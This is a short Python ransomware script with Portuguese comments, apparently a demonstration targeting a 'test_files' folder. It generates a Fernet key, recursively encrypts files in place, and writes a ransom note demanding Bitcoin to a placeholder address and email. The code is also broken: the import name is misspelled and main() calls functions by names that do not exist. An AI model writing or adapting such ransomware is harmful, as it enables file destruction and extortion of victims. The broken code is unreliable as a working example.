from crypography.fernet import Fernet
import os

# 1 gerar uma chave de criptografia e salvar
def gerar_key():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2 carregar a chave de criptografia
def carregar_key():
    return open("chave.key", "rb").read()

# 3 criptografar arquivos
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 4 encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)   
    return lista

# 5 mensagem de resgate
def criar_mensagem():
    with open("LEIA-ME.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Para recuperar seus arquivos, envie 1 Bitcoin para o endereço XXXXXX.\n")
        f.write("Depois de enviar o pagamento, envie um email para decrypt@domain.\n")
        f.write("Você receberá a chave de descriptografia.")

# 6 executar o ransomware
def main():
    gerar_chave ()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Seus arquivos foram criptografados!")

if __name__ == "__main__":
    main()